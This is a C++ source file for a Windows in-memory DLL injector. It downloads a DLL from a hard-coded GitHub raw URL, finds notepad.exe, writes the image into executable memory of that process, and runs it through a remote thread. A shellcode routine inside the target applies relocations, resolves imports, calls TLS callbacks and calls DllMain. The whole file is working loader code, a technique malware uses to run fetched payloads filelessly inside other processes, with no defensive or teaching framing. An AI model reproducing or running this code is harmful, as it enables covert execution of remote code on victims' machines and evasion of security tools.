// main.cpp
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <vector>
#include <iostream>
#include <string>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ntdll.lib")  // Needed for RtlAddFunctionTable

// === Architecture (change only if injecting 32-bit DLL) ===
#define CURRENT_ARCH IMAGE_FILE_MACHINE_AMD64   // Use IMAGE_FILE_MACHINE_I386 for x86

// Relocation flags
#define RELOC_FLAG32(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_HIGHLOW)
#define RELOC_FLAG64(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_DIR64)

#ifdef _WIN64
#define RELOC_FLAG RELOC_FLAG64
#else
#define RELOC_FLAG RELOC_FLAG32
#endif

// Function typedefs
using f_LoadLibraryA = HINSTANCE(WINAPI*)(LPCSTR);
using f_GetProcAddress = FARPROC(WINAPI*)(HMODULE, LPCSTR);
using f_DLL_ENTRY_POINT = BOOL(WINAPI*)(HMODULE, DWORD, LPVOID);
#ifdef _WIN64
using f_RtlAddFunctionTable = BOOL(WINAPI*)(PRUNTIME_FUNCTION, DWORD, DWORD64);
#endif

// Data structure passed to shellcode
struct MANUAL_MAPPING_DATA {
    f_LoadLibraryA        pLoadLibraryA;
    f_GetProcAddress      pGetProcAddress;
#ifdef _WIN64
    f_RtlAddFunctionTable pRtlAddFunctionTable;
#endif
    BYTE* pBase;
    HINSTANCE             hMod;
    DWORD                 fdwReasonParam;
    LPVOID                reservedParam;
    BOOL                  SEHSupport;
};

// Shellcode - runs inside target process
#pragma runtime_checks("", off)
#pragma optimize("", off)
void __stdcall Shellcode(MANUAL_MAPPING_DATA* pData) {
    if (!pData) {
        pData->hMod = (HINSTANCE)0x404040;
        return;
    }

    BYTE* pBase = pData->pBase;
    auto* pDos = (IMAGE_DOS_HEADER*)pBase;
    auto* pNt = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
    auto* pOpt = &pNt->OptionalHeader;

    auto _LoadLibraryA = pData->pLoadLibraryA;
    auto _GetProcAddress = pData->pGetProcAddress;
#ifdef _WIN64
    auto _RtlAddFunctionTable = pData->pRtlAddFunctionTable;
#endif
    auto _DllMain = (f_DLL_ENTRY_POINT)(pBase + pOpt->AddressOfEntryPoint);

    INT64 delta = (INT64)pBase - (INT64)pOpt->ImageBase;

    // === Relocations ===
    if (delta && pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        auto* reloc = (IMAGE_BASE_RELOCATION*)(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress) {
            UINT entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* list = (WORD*)(reloc + 1);
            for (UINT i = 0; i < entries; ++i) {
                if (RELOC_FLAG(list[i])) {
                    UINT_PTR* patch = (UINT_PTR*)(pBase + reloc->VirtualAddress + (list[i] & 0xFFF));
                    *patch += (UINT_PTR)delta;
                }
            }
            reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    // === Imports ===
    if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        auto* imp = (IMAGE_IMPORT_DESCRIPTOR*)(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (imp->Name) {
            HMODULE mod = _LoadLibraryA((LPCSTR)(pBase + imp->Name));
            ULONG_PTR* thunk = (ULONG_PTR*)(pBase + imp->FirstThunk);
            ULONG_PTR* orig = imp->OriginalFirstThunk ? (ULONG_PTR*)(pBase + imp->OriginalFirstThunk) : thunk;
            while (*orig) {
                FARPROC func;
                if (*orig & IMAGE_ORDINAL_FLAG64)
                    func = _GetProcAddress(mod, (LPCSTR)(*orig & 0xFFFF));
                else {
                    auto* ibn = (IMAGE_IMPORT_BY_NAME*)(pBase + *orig);
                    func = _GetProcAddress(mod, ibn->Name);
                }
                *thunk = (ULONG_PTR)func;
                ++thunk;
                ++orig;
            }
            ++imp;
        }
    }

    // === TLS Callbacks ===
    if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
        auto* tls = (IMAGE_TLS_DIRECTORY*)(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
        auto** callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
        if (callback) {
            while (*callback) {
                (*callback)((void*)pBase, DLL_PROCESS_ATTACH, nullptr);
                ++callback;
            }
        }
    }

    // === Exception Directory (SEH) - x64 only ===
    BOOL sehFailed = FALSE;
#ifdef _WIN64
    if (pData->SEHSupport && pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size) {
        auto* excep = (IMAGE_RUNTIME_FUNCTION_ENTRY*)(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
        DWORD count = pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
        if (!_RtlAddFunctionTable(excep, count, (DWORD64)pBase))
            sehFailed = TRUE;
    }
#endif

    // === Call DllMain - FIXED: cast pBase to HMODULE ===
    _DllMain((HMODULE)pBase, pData->fdwReasonParam, pData->reservedParam);

    pData->hMod = sehFailed ? (HINSTANCE)0x505050 : (HINSTANCE)pBase;
}
#pragma optimize("", on)
#pragma runtime_checks("", restore)

// === Download DLL from URL ===
bool DownloadDll(const std::string& url, std::vector<BYTE>& buffer) {
    HINTERNET hInternet = InternetOpenA("Injector", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (!hInternet) return false;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), nullptr, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) { InternetCloseHandle(hInternet); return false; }

    DWORD bytesRead;
    BYTE temp[8192];
    buffer.clear();
    while (InternetReadFile(hUrl, temp, sizeof(temp), &bytesRead) && bytesRead)
        buffer.insert(buffer.end(), temp, temp + bytesRead);

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return !buffer.empty();
}

// === Find process ===
DWORD FindProcessId(const std::wstring& name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name.c_str()) == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return 0;
}

// === Injection function ===
bool InjectInMemory(HANDLE hProc, BYTE* pDllData, SIZE_T dllSize) {
    auto* dos = (IMAGE_DOS_HEADER*)pDllData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    auto* nt = (IMAGE_NT_HEADERS*)(pDllData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    if (nt->FileHeader.Machine != CURRENT_ARCH) {
        std::cerr << "Architecture mismatch!" << std::endl;
        return false;
    }

    BYTE* pRemoteBase = (BYTE*)VirtualAllocEx(hProc, nullptr, nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteBase) return false;

    // Write headers and sections
    WriteProcessMemory(hProc, pRemoteBase, pDllData, nt->OptionalHeader.SizeOfHeaders, nullptr);
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->SizeOfRawData) {
            WriteProcessMemory(hProc, pRemoteBase + sec->VirtualAddress,
                pDllData + sec->PointerToRawData, sec->SizeOfRawData, nullptr);
        }
    }

    // Setup mapping data
    MANUAL_MAPPING_DATA data{};
    data.pLoadLibraryA = LoadLibraryA;
    data.pGetProcAddress = GetProcAddress;
#ifdef _WIN64
    data.pRtlAddFunctionTable = (f_RtlAddFunctionTable)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAddFunctionTable");
#endif
    data.pBase = pRemoteBase;
    data.fdwReasonParam = DLL_PROCESS_ATTACH;
    data.reservedParam = nullptr;
    data.SEHSupport = TRUE;

    BYTE* pRemoteData = (BYTE*)VirtualAllocEx(hProc, nullptr, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteData) { VirtualFreeEx(hProc, pRemoteBase, 0, MEM_RELEASE); return false; }
    WriteProcessMemory(hProc, pRemoteData, &data, sizeof(data), nullptr);

    // Write shellcode
    const SIZE_T shellSize = 4096;
    BYTE* pRemoteShell = (BYTE*)VirtualAllocEx(hProc, nullptr, shellSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteShell) {
        VirtualFreeEx(hProc, pRemoteBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, pRemoteData, 0, MEM_RELEASE);
        return false;
    }
    WriteProcessMemory(hProc, pRemoteShell, (void*)Shellcode, shellSize, nullptr);

    // Execute
    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)pRemoteShell, pRemoteData, 0, nullptr);
    if (!hThread) {
        VirtualFreeEx(hProc, pRemoteBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, pRemoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, pRemoteShell, 0, MEM_RELEASE);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Verify result
    MANUAL_MAPPING_DATA result{};
    ReadProcessMemory(hProc, pRemoteData, &result, sizeof(result), nullptr);
    if (!result.hMod || result.hMod == (HINSTANCE)0x404040 || result.hMod == (HINSTANCE)0x505050)
        return false;

    std::cout << "Injection successful!" << std::endl;
    return true;
}

// === Main ===
int main() {
    std::string url = "https://github.com/Satallite69/T/raw/refs/heads/main/susu.dll ";

    std::vector<BYTE> dllBuffer;
    if (!DownloadDll(url, dllBuffer)) {
        std::cerr << "Download failed." << std::endl;
        return 1;
    }
    std::cout << "DLL downloaded: " << dllBuffer.size() << " bytes\n";

    DWORD pid = FindProcessId(L"notepad.exe");
    if (!pid) {
        std::cerr << "notepad.exe not found." << std::endl;
        return 1;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        std::cerr << "OpenProcess failed - run as admin." << std::endl;
        return 1;
    }

    if (InjectInMemory(hProc, dllBuffer.data(), dllBuffer.size()))
        std::cout << "DLL injected successfully!" << std::endl;
    else
        std::cerr << "Injection failed." << std::endl;

    CloseHandle(hProc);
    return 0;
}